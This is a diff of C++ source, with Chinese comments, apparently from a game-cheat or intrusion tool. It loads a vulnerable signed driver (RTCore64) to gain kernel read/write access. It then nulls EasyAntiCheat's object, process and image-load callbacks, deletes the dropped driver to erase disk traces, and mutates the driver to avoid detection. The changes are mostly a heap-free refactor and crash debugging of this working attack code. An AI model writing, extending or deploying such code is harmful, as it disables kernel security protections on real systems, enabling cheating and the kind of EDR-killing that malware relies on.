-        ByovdDiag("BYOVD:GetKernelModuleBase: EnumDeviceDrivers FAILED (err=%u)\n", GetLastError());
-        return 0;
+    // 使用 VirtualAlloc 替代 std::vector — 不依赖 CRT 堆
+    ULONG bufSize = 0x1000;
+    BYTE* buf = nullptr;
+
+    for (int retry = 0; retry < 3; retry++) {
+        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
+        buf = (BYTE*)VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buf) {
+            ByovdDiag("BYOVD:GetKernelModuleBase: VirtualAlloc(%u) FAILED\n", bufSize);
+            return 0;
+        }
+        ULONG retLen = 0;
+        LONG status = pNtQsi(11, buf, bufSize, &retLen);
+        if (NT_SUCCESS(status)) break;
+        if (status != 0xC0000004) { // STATUS_INFO_LENGTH_MISMATCH
+            ByovdDiag("BYOVD:GetKernelModuleBase: NtQSI FAILED status=0x%08X\n", status);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            return 0;
+        }
+        bufSize = retLen + 0x1000;
     }
 
-    int driverCount = cbNeeded / sizeof(LPVOID);
-    ByovdDiag("BYOVD:GetKernelModuleBase: %d kernel drivers found, searching '%s'...\n",
-        driverCount, moduleName.c_str());
+    if (!buf) return 0;
 
-    for (int i = 0; i < driverCount; i++) {
-        char baseName[256] = {};
-        DWORD nameLen = GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName));
-        if (nameLen > 0) {
-            if (_stricmp(baseName, moduleName.c_str()) == 0) {
-                ByovdDiag("BYOVD:GetKernelModuleBase: found %s at 0x%p\n", baseName, drivers[i]);
-                return (uint64_t)drivers[i];
+    // SYSTEM_MODULE_INFORMATION (Windows 10/11 x64):
+    //   ULONG Count + SYSTEM_MODULE_ENTRY[Count]
+    // SYSTEM_MODULE_ENTRY:
+    //   +0x00: HANDLE  Section        (8 bytes)
+    //   +0x08: PVOID   MappedBase     (8 bytes) — 内核模块映射基址 (用于读取)
+    //   +0x10: PVOID   ImageBase      (8 bytes)
+    //   +0x18: ULONG   ImageSize      (4 bytes)
+    //   +0x1C: ULONG   Flags          (4 bytes)
+    //   +0x20: USHORT  LoadOrderIndex  (2 bytes)
+    //   +0x22: USHORT  InitOrderIndex  (2 bytes)
+    //   +0x24: USHORT  LoadCount       (2 bytes)
+    //   +0x26: USHORT  OffsetToFileName (2 bytes)
+    //   +0x28: CHAR    FullPathName[256]
+    //   条目总大小: 0x128 (296) 字节
+    ULONG count = *(ULONG*)buf;
+    uintptr_t entryPtr = (uintptr_t)buf + sizeof(ULONG);
+    const size_t entrySize = 0x128; // 296 bytes
+
+    uint64_t result = 0;
+    for (ULONG i = 0; i < count; i++) {
+        // FullPathName 在 +0x28
+        const char* fullPath = (const char*)(entryPtr + 0x28);
+        // 从完整路径中提取文件名 (最后一个反斜杠后)
+        const char* baseName = strrchr(fullPath, '\\');
+        if (!baseName) baseName = fullPath;
+        else baseName++;
+
+        if (_stricmp(baseName, moduleName) == 0) {
+            // MappedBase 在 +0x08
+            result = *(uint64_t*)(entryPtr + 0x08);
+            ByovdDiag("BYOVD:GetKernelModuleBase: found %s at 0x%llX (entry=%zu)\n",
+                      baseName, (unsigned long long)result, i);
+            break;
+        }
+
+        entryPtr += entrySize;
+    }
+
+    VirtualFree(buf, 0, MEM_RELEASE);
+
+    if (result) return result;
+
+    // 回退: 尝试 EnumDeviceDrivers
+    LPVOID drivers[1024];
+    DWORD cbNeeded = 0;
+    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded)) {
+        int driverCount = cbNeeded / sizeof(LPVOID);
+        ByovdDiag("BYOVD:GetKernelModuleBase: fallback EnumDeviceDrivers, %d drivers\n", driverCount);
+        for (int i = 0; i < driverCount; i++) {
+            char baseName[256] = {};
+            DWORD nameLen = GetDeviceDriverBaseNameA(drivers[i], baseName, sizeof(baseName));
+            if (nameLen > 0) {
+                if (_stricmp(baseName, moduleName) == 0) {
+                    ByovdDiag("BYOVD:GetKernelModuleBase: fallback found %s at 0x%p\n", baseName, drivers[i]);
+                    return (uint64_t)drivers[i];
+                }
             }
         }
     }
 
-    ByovdDiag("BYOVD:GetKernelModuleBase: '%s' NOT FOUND among %d drivers\n",
-        moduleName.c_str(), driverCount);
+    ByovdDiag("BYOVD:GetKernelModuleBase: '%s' NOT FOUND\n", moduleName);
     return 0;
+}
+
+// ★ v3.116: std::string 重载 — 委托给 const char* 版本 (避免 CRT 堆分配)
+uint64_t KernelMemoryAccessor::GetKernelModuleBase(const std::string& moduleName) {
+    return GetKernelModuleBase(moduleName.c_str());
 }
 
 // ============================================================
@@ -1306,28 +1464,21 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
         nullptr, OPEN_EXISTING, 0, nullptr);
 
     if (m_hDevice != INVALID_HANDLE_VALUE) {
-        // ★ v3.105: 设备已存在, 先探测 IOCTL 码再测试内核读取
-        //   之前直接使用默认 IOCTL (0xC3502580 → err=87) 导致误判僵尸设备
-        ByovdDiag("BYOVD:Init: existing device opened, probing IOCTL...\n");
-        uint8_t* testVA = nullptr;
-        uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, &testVA);
-        if (probedIoctl != 0) {
-            // IOCTL 探测成功 → 设备可用, 更新 IOCTL 码
-            m_driverInfo.ioctlCode = probedIoctl;
-            m_active = true;
-            m_ntosBase = GetNtoskrnlBase();
-            if (m_ntosBase) {
-                uint16_t magic = 0;
-                bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
-                if (probeOk && magic == 0x5A4D) {
-                    ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
-                        (unsigned long long)m_ntosBase, probedIoctl);
-                    return true;
-                }
-                ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
+        // ★ v3.114: 已有设备, 直接用默认 IOCTL 码测试内核读取
+        //   不再调用 ProbeIoctlCode — 硬编码地址探测会导致蓝屏
+        ByovdDiag("BYOVD:Init: existing device opened, testing with default IOCTL 0x%08X...\n",
+            m_driverInfo.ioctlCode);
+        m_active = true;
+        m_ntosBase = GetNtoskrnlBase();
+        if (m_ntosBase) {
+            uint16_t magic = 0;
+            bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
+            if (probeOk && magic == 0x5A4D) {
+                ByovdDiag("BYOVD:Init: reusing existing device OK (ntos=0x%llX, ioctl=0x%08X)\n",
+                    (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
+                return true;
             }
-        } else {
-            ByovdDiag("BYOVD:Init: existing device IOCTL probe FAILED\n");
+            ByovdDiag("BYOVD:Init: existing device kernel read FAILED (magic=0x%04X)\n", magic);
         }
         // ★ v3.96: 僵尸设备 — IOCTL 不可用, 设备对象残留但无驱动
         //   NtMakeTemporaryObject 对文件句柄无效 (需要设备对象句柄),
@@ -1380,23 +1531,20 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                 nullptr, OPEN_EXISTING, 0, nullptr);
             if (m_hDevice != INVALID_HANDLE_VALUE) {
-                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, probing IOCTL...\n");
-                uint8_t* testVA2 = nullptr;
-                uint32_t probedIoctl2 = ProbeIoctlCode(m_hDevice, &testVA2);
-                if (probedIoctl2 != 0) {
-                    m_driverInfo.ioctlCode = probedIoctl2;
-                    m_active = true;
-                    m_ntosBase = GetNtoskrnlBase();
-                    if (m_ntosBase) {
-                        uint16_t magic = 0;
-                        bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
-                        if (probeOk && magic == 0x5A4D) {
-                            ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
-                                (unsigned long long)m_ntosBase, probedIoctl2);
-                            return true;
-                        }
-                        ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
+                // ★ v3.114: 直接用默认 IOCTL 码测试, 不再调用 ProbeIoctlCode
+                ByovdDiag("BYOVD:Init: zombie device opened after symlink fix, testing IOCTL 0x%08X...\n",
+                    m_driverInfo.ioctlCode);
+                m_active = true;
+                m_ntosBase = GetNtoskrnlBase();
+                if (m_ntosBase) {
+                    uint16_t magic = 0;
+                    bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
+                    if (probeOk && magic == 0x5A4D) {
+                        ByovdDiag("BYOVD:Init: zombie device IOCTL OK (ntos=0x%llX, ioctl=0x%08X)\n",
+                            (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
+                        return true;
                     }
+                    ByovdDiag("BYOVD:Init: zombie device IOCTL FAILED (magic=0x%04X)\n", magic);
                 }
                 ByovdDiag("BYOVD:Init: ZOMBIE DEVICE DETECTED — reboot required to clear\n");
                 CloseHandle(m_hDevice);
@@ -1429,35 +1577,39 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     }
     ByovdDiag("BYOVD:Init: device opened OK\n");
 
-    // ★ v3.98: 探测正确的 IOCTL 码和格式
-    {
-        uint8_t* testVA = nullptr;
-        uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, &testVA);
-        if (probedIoctl == 0) {
-            ByovdDiag("BYOVD:Init: IOCTL probe FAILED — no working IOCTL found\n");
-            CloseHandle(m_hDevice);
-            m_hDevice = INVALID_HANDLE_VALUE;
-            UnloadDriver(m_actualServiceName);
-            return false;
-        }
-        ByovdDiag("BYOVD:Init: IOCTL probe OK — using ioctl=0x%08X (was 0x%08X)\n",
-                  probedIoctl, m_driverInfo.ioctlCode);
-        m_driverInfo.ioctlCode = probedIoctl; // 更新为实际可用的 IOCTL 码
-    }
+    // ★ v3.119: 在驱动加载后延迟 500ms, 让驱动内部稳定, 避免 BSOD
+    //   某些 Windows 版本在加载 RTCore64 后立即发送 IOCTL 会导致内核崩溃
+    Sleep(500);
+    ByovdDiag("BYOVD:Init: post-load delay done\n");
+
+    // ★ v3.118: 精确定位BSOD位置 — 分步日志
+    ByovdDiag("BYOVD:Init: STEP_A calling GetNtoskrnlBase...\n");
+    // ★ v3.116: SEH 已移除 — GetKernelModuleBase 内部已用 VirtualAlloc 替代 std::vector
+    //   且返回 0 表示失败, 无需额外异常保护
+    m_ntosBase = GetNtoskrnlBase();
+    ByovdDiag("BYOVD:Init: STEP_A1 GetNtoskrnlBase returned 0x%llX\n",
+              (unsigned long long)m_ntosBase);
+    ByovdDiag("BYOVD:Init: STEP_B ntos=0x%llX, ioctl=0x%08X\n",
+              (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
 
     // ★ v3.110: 驱动加载成功, 立即删除临时文件抹除磁盘痕迹
     if (!actualPath.empty()) {
+        ByovdDiag("BYOVD:Init: STEP_C deleting temp file '%ls'...\n", actualPath.c_str());
         DeleteFileW(actualPath.c_str());
-        ByovdDiag("BYOVD:Init: deleted temp driver file '%ls'\n", actualPath.c_str());
+        ByovdDiag("BYOVD:Init: STEP_C deleted OK\n");
     }
 
     m_active = true;
-    m_ntosBase = GetNtoskrnlBase();
+    ByovdDiag("BYOVD:Init: STEP_D m_active=true, about to ReadKernelVA...\n");
 
     // v3.25: 探测 IOCTL 验证驱动 R/W 确实可用
     if (m_ntosBase) {
         uint16_t magic = 0;
+        ByovdDiag("BYOVD:Init: STEP_E calling ReadKernelVA(0x%llX, 2)...\n",
+                  (unsigned long long)m_ntosBase);
         bool probeOk = ReadKernelVA(m_ntosBase, &magic, 2);
+        ByovdDiag("BYOVD:Init: STEP_E1 ReadKernelVA returned %d, magic=0x%04X\n",
+                  (int)probeOk, magic);
         if (!probeOk || magic != 0x5A4D) {
             ByovdDiag("BYOVD:Init: IOCTL probe FAILED (magic=0x%04X, expect 0x5A4D)\n", magic);
             m_active = false;
@@ -1471,6 +1623,7 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     } else {
         ByovdDiag("BYOVD:Init: WARN cannot locate ntoskrnl, but driver loaded\n");
     }
+    ByovdDiag("BYOVD:Init: STEP_F returning true (success)\n");
 
     return true;
 }
@@ -1482,7 +1635,7 @@ void KernelMemoryAccessor::Shutdown() {
     EnablePrivilege(L"SeLoadDriverPrivilege");
     m_active = false;
     m_pageTableWalker.reset();
-    g_physMappings.clear();
+    g_physMappingCount = 0; // ★ v3.118: 固定数组, 无需 clear()
 
     if (!m_actualServiceName.empty()) {
         // ★ v3.96: SCM STOP → 触发驱动 Unload 例程 → IoDeleteDevice
@@ -1519,19 +1672,26 @@ void KernelMemoryAccessor::Shutdown() {
     }
 }
 
-// ★ v3.69: 注册 DLL 代码区域 (由 payload.cpp 在 EnableAll 前调用)
+// ★ v3.69/v3.117: 注册 DLL 代码区域 (固定数组, 避免 CRT 堆)
 void KernelMemoryAccessor::RegisterCodeRegion(void* base, SIZE_T size) {
     if (!base || size == 0) return;
-    ProtectedUserRegion region;
+    if (g_protectedRegionCount >= MAX_PROTECTED_REGIONS) {
+        ByovdDiag("BYOVD:RegisterCodeRegion: MAX_PROTECTED_REGIONS (%zu) reached, skipping\n",
+                  MAX_PROTECTED_REGIONS);
+        return;
+    }
+    ProtectedUserRegion& region = g_protectedUserRegions[g_protectedRegionCount];
     region.base = reinterpret_cast<uintptr_t>(base);
     region.size = size;
-    g_protectedUserRegions.push_back(region);
+    g_protectedRegionCount++;
 }
 
 // ★ v3.69: 检查 VA 范围是否与受保护区域重叠
 bool KernelMemoryAccessor::IsOverlappingProtectedRegion(uintptr_t va, SIZE_T size) {
     uintptr_t vaEnd = va + size;
-    for (auto& r : g_protectedUserRegions) {
+    // ★ v3.118: 只遍历有效条目 (g_protectedRegionCount), 避免遍历全数组
+    for (int ri = 0; ri < g_protectedRegionCount; ri++) {
+        const ProtectedUserRegion& r = g_protectedUserRegions[ri];
         uintptr_t rEnd = r.base + r.size;
         // 检查区间重叠: [va, vaEnd) 与 [r.base, rEnd)
         if (va < rEnd && vaEnd > r.base) {
@@ -1547,7 +1707,7 @@ bool KernelMemoryAccessor::IsKernelAddressValid(uint64_t va) {
     if (va < 0xFFFF800000000000ULL) return false;
     if (va > 0xFFFFFFFFFFFFFFFFULL) return false;
 
-    // ★ v3.109: IOCTL 0x80002048 直接读取内核虚拟地址, 无需 VA→PA 转换
+    // ★ v3.114: IOCTL_VIRTUAL_MEM (0x80002000) 直接读取内核虚拟地址, 无需 VA→PA 转换
     //   移除 PageTableWalker 依赖 (旧代码通过物理内存扫描 PML4, 不兼容内核VA IOCTL)
     //   只要驱动可用且 VA 在内核范围, 即视为有效
     return m_active;
@@ -1650,8 +1810,8 @@ int EACCallbackDisabler::DisableObCallbacks(const std::string& eacDriverName) {
     constexpr uint32_t CB_ENTRY_SIZE = 0x40;
     constexpr uint32_t MAX_CALLBACKS = 256;
 
-    // ★ v3.110: 先清空保存的记录 (重新摘除时重新保存)
-    m_savedObCallbacks.clear();
+    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedObCallbackCount = 0;
 
     int removed = 0;
     uint64_t current = cbArrayHead;
@@ -1684,12 +1844,12 @@ int EACCallbackDisabler::DisableObCallbacks(const std::string& eacDriverName) {
                         // ★ v3.110: 先保存原始值再 NULL 化
                         uint64_t preOp = kma.Read<uint64_t>(current + 0x18);
                         uint64_t postOp = kma.Read<uint64_t>(current + 0x28);
-                        if (preOp || postOp) {
-                            SavedObEntry saved;
+                        if ((preOp || postOp) && m_savedObCallbackCount < MAX_SAVED_OB_CALLBACKS) {
+                            SavedObEntry& saved = m_savedObCallbacks[m_savedObCallbackCount];
                             saved.address = current;
                             saved.preOp = preOp;
                             saved.postOp = postOp;
-                            m_savedObCallbacks.push_back(saved);
+                            m_savedObCallbackCount++;
                         }
 
                         // NULL 化 PreOperation + PostOperation
@@ -1712,7 +1872,7 @@ int EACCallbackDisabler::DisableObCallbacks(const std::string& eacDriverName) {
         current += CB_ENTRY_SIZE;
     }
 
-    m_obCallbacksSaved = !m_savedObCallbacks.empty();
+    m_obCallbacksSaved = (m_savedObCallbackCount > 0);
     return removed;
 }
 
@@ -1751,8 +1911,8 @@ int EACCallbackDisabler::DisableProcessNotifyCallbacks(const std::string& eacDri
 
     // EX_FAST_REF 数组 (每个 entry 8 bytes, 高4位是引用计数, 低60位是指针)
     // 最多 64 个回调
-    // ★ v3.110: 先清空保存的记录
-    m_savedProcessCallbacks.clear();
+    // ★ v3.119: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedProcessCallbackCount = 0;
 
     int removed = 0;
     for (int i = 0; i < 64; i++) {
@@ -1761,11 +1921,13 @@ int EACCallbackDisabler::DisableProcessNotifyCallbacks(const std::string& eacDri
 
         uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL; // 清除高4位引用计数
         if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
-            // ★ v3.110: 保存原始值
-            SavedArrayEntry saved;
-            saved.address = arrayAddr + i * 8;
-            saved.originalValue = entry;
-            m_savedProcessCallbacks.push_back(saved);
+            // ★ v3.119: 保存原始值 (固定数组)
+            if (m_savedProcessCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
+                SavedArrayEntry& saved = m_savedProcessCallbacks[m_savedProcessCallbackCount];
+                saved.address = arrayAddr + i * 8;
+                saved.originalValue = entry;
+                m_savedProcessCallbackCount++;
+            }
 
             // NULL 化此条目
             uint64_t zero = 0;
@@ -1774,7 +1936,7 @@ int EACCallbackDisabler::DisableProcessNotifyCallbacks(const std::string& eacDri
         }
     }
 
-    m_processCallbacksSaved = !m_savedProcessCallbacks.empty();
+    m_processCallbacksSaved = (m_savedProcessCallbackCount > 0);
     return removed;
 }
 
@@ -1808,8 +1970,8 @@ int EACCallbackDisabler::DisableImageNotifyCallbacks(const std::string& eacDrive
 
     if (!arrayAddr) return 0;
 
-    // ★ v3.110: 先清空保存的记录
-    m_savedImageCallbacks.clear();
+    // ★ v3.110: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedImageCallbackCount = 0;
 
     int removed = 0;
     for (int i = 0; i < 64; i++) {
@@ -1818,10 +1980,12 @@ int EACCallbackDisabler::DisableImageNotifyCallbacks(const std::string& eacDrive
         uint64_t callbackPtr = entry & 0xFFFFFFFFFFFFFFFULL;
         if (IsAddressInModule(callbackPtr, eacBase, 0x100000)) {
             // ★ v3.110: 保存原始值
-            SavedArrayEntry saved;
-            saved.address = arrayAddr + i * 8;
-            saved.originalValue = entry;
-            m_savedImageCallbacks.push_back(saved);
+            if (m_savedImageCallbackCount < MAX_SAVED_ARRAY_CALLBACKS) {
+                SavedArrayEntry& saved = m_savedImageCallbacks[m_savedImageCallbackCount];
+                saved.address = arrayAddr + i * 8;
+                saved.originalValue = entry;
+                m_savedImageCallbackCount++;
+            }
 
             uint64_t zero = 0;
             kma.Write(arrayAddr + i * 8, zero);
@@ -1829,7 +1993,7 @@ int EACCallbackDisabler::DisableImageNotifyCallbacks(const std::string& eacDrive
         }
     }
 
-    m_imageCallbacksSaved = !m_savedImageCallbacks.empty();
+    m_imageCallbacksSaved = (m_savedImageCallbackCount > 0);
     return removed;
 }
 
@@ -1850,34 +2014,43 @@ int EACCallbackDisabler::RestoreAll() {
     int restored = 0;
 
     // 1. 恢复 ObRegisterCallbacks
-    for (auto& saved : m_savedObCallbacks) {
+    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
+    for (int i = 0; i < m_savedObCallbackCount; i++) {
+        SavedObEntry& saved = m_savedObCallbacks[i];
         if (kma.IsKernelAddressValid(saved.address)) {
             kma.Write(saved.address + 0x18, saved.preOp);  // PreOperation
             kma.Write(saved.address + 0x28, saved.postOp); // PostOperation
             restored++;
         }
     }
-    m_savedObCallbacks.clear();
+    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedObCallbackCount = 0;
     m_obCallbacksSaved = false;
 
     // 2. 恢复进程通知回调
-    for (auto& saved : m_savedProcessCallbacks) {
+    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
+    for (int i = 0; i < m_savedProcessCallbackCount; i++) {
+        SavedArrayEntry& saved = m_savedProcessCallbacks[i];
         if (kma.IsKernelAddressValid(saved.address)) {
             kma.Write(saved.address, saved.originalValue);
             restored++;
         }
     }
-    m_savedProcessCallbacks.clear();
+    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedProcessCallbackCount = 0;
     m_processCallbacksSaved = false;
 
     // 3. 恢复模块加载通知回调
-    for (auto& saved : m_savedImageCallbacks) {
+    // ★ v3.120: 索引循环替代 range-for — 与固定数组配合
+    for (int i = 0; i < m_savedImageCallbackCount; i++) {
+        SavedArrayEntry& saved = m_savedImageCallbacks[i];
         if (kma.IsKernelAddressValid(saved.address)) {
             kma.Write(saved.address, saved.originalValue);
             restored++;
         }
     }
-    m_savedImageCallbacks.clear();
+    // ★ v3.120: 重置计数器, 避免 std::vector CRT 堆依赖
+    m_savedImageCallbackCount = 0;
     m_imageCallbacksSaved = false;
 
     ByovdDiag("BYOVD:EACCallbackDisabler: restored %d callbacks (EAC heartbeat bypass)\n", restored);
@@ -1910,29 +2083,47 @@ uint64_t KernelMemoryAccessor::ResolveExport(uint64_t moduleBase, const char* fu
     IMAGE_EXPORT_DIRECTORY ied = {};
     if (!ReadKernelVA(expVA, &ied, sizeof(ied))) return 0;
 
-    // 读取导出表 (3个数组: 名称→序号→地址)
-    std::vector<uint32_t> nameRVAs(ied.NumberOfNames);
-    std::vector<uint32_t> funcRVAs(ied.NumberOfFunctions);
-    std::vector<uint16_t> ordinals(ied.NumberOfNames);
+    // ★ v3.118: 使用 VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
+    uint32_t* nameRVAs = nullptr;
+    uint32_t* funcRVAs = nullptr;
+    uint16_t* ordinals = nullptr;
+    uint64_t result = 0;
 
-    if (!ReadKernelVA(moduleBase + ied.AddressOfNames, nameRVAs.data(),
-                       nameRVAs.size() * sizeof(uint32_t))) return 0;
-    if (!ReadKernelVA(moduleBase + ied.AddressOfFunctions, funcRVAs.data(),
-                       funcRVAs.size() * sizeof(uint32_t))) return 0;
-    if (!ReadKernelVA(moduleBase + ied.AddressOfNameOrdinals, ordinals.data(),
-                       ordinals.size() * sizeof(uint16_t))) return 0;
+    nameRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint32_t),
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    funcRVAs = (uint32_t*)VirtualAlloc(nullptr, ied.NumberOfFunctions * sizeof(uint32_t),
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    ordinals = (uint16_t*)VirtualAlloc(nullptr, ied.NumberOfNames * sizeof(uint16_t),
+                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    // 二分搜索导出名
+    if (!nameRVAs || !funcRVAs || !ordinals) {
+        ByovdDiag("BYOVD:ResolveExport: VirtualAlloc FAILED\n");
+        goto cleanup;
+    }
+
+    if (!ReadKernelVA(moduleBase + ied.AddressOfNames, nameRVAs,
+                       ied.NumberOfNames * sizeof(uint32_t))) goto cleanup;
+    if (!ReadKernelVA(moduleBase + ied.AddressOfFunctions, funcRVAs,
+                       ied.NumberOfFunctions * sizeof(uint32_t))) goto cleanup;
+    if (!ReadKernelVA(moduleBase + ied.AddressOfNameOrdinals, ordinals,
+                       ied.NumberOfNames * sizeof(uint16_t))) goto cleanup;
+
+    // 线性搜索导出名
     for (DWORD i = 0; i < ied.NumberOfNames; i++) {
         char name[128] = {};
         ReadKernelVA(moduleBase + nameRVAs[i], name, sizeof(name) - 1);
         if (strcmp(name, funcName) == 0) {
             uint32_t rva = funcRVAs[ordinals[i]];
-            return moduleBase + rva;
+            result = moduleBase + rva;
+            break;
         }
     }
 
-    return 0;
+cleanup:
+    if (nameRVAs) VirtualFree(nameRVAs, 0, MEM_RELEASE);
+    if (funcRVAs) VirtualFree(funcRVAs, 0, MEM_RELEASE);
+    if (ordinals) VirtualFree(ordinals, 0, MEM_RELEASE);
+    return result;
 }
 
 // ============================================================
@@ -2098,18 +2289,21 @@ static BYOVDDriverInfo MutateAndRandomizeDriver(const BYOVDDriverInfo& original)
         if (hSrc == INVALID_HANDLE_VALUE) return original;
         DWORD fileSize = GetFileSize(hSrc, nullptr);
         if (fileSize < 0x200 || fileSize > 100 * 1024 * 1024) { CloseHandle(hSrc); return original; }
-        std::vector<uint8_t> driverData(fileSize);
+        // ★ v3.120: VirtualAlloc 替代 std::vector — 避免 CRT 堆依赖
+        uint8_t* driverData = (uint8_t*)VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_READWRITE);
+        if (!driverData) { CloseHandle(hSrc); return original; }
         DWORD bytesRead = 0;
-        ReadFile(hSrc, driverData.data(), fileSize, &bytesRead, nullptr);
+        ReadFile(hSrc, driverData, fileSize, &bytesRead, nullptr);
         CloseHandle(hSrc);
-        if (bytesRead != fileSize) return original;
+        if (bytesRead != fileSize) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }
 
         HANDLE hOut = CreateFileW(tempPath, GENERIC_WRITE, 0, nullptr,
             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
-        if (hOut == INVALID_HANDLE_VALUE) return original;
+        if (hOut == INVALID_HANDLE_VALUE) { VirtualFree(driverData, 0, MEM_RELEASE); return original; }
         DWORD bytesWritten = 0;
-        WriteFile(hOut, driverData.data(), fileSize, &bytesWritten, nullptr);
+        WriteFile(hOut, driverData, fileSize, &bytesWritten, nullptr);
         CloseHandle(hOut);
+        VirtualFree(driverData, 0, MEM_RELEASE);
         if (bytesWritten != fileSize) return original;
     } else {
         // 直接写入原始嵌入数据 (不做任何修改)
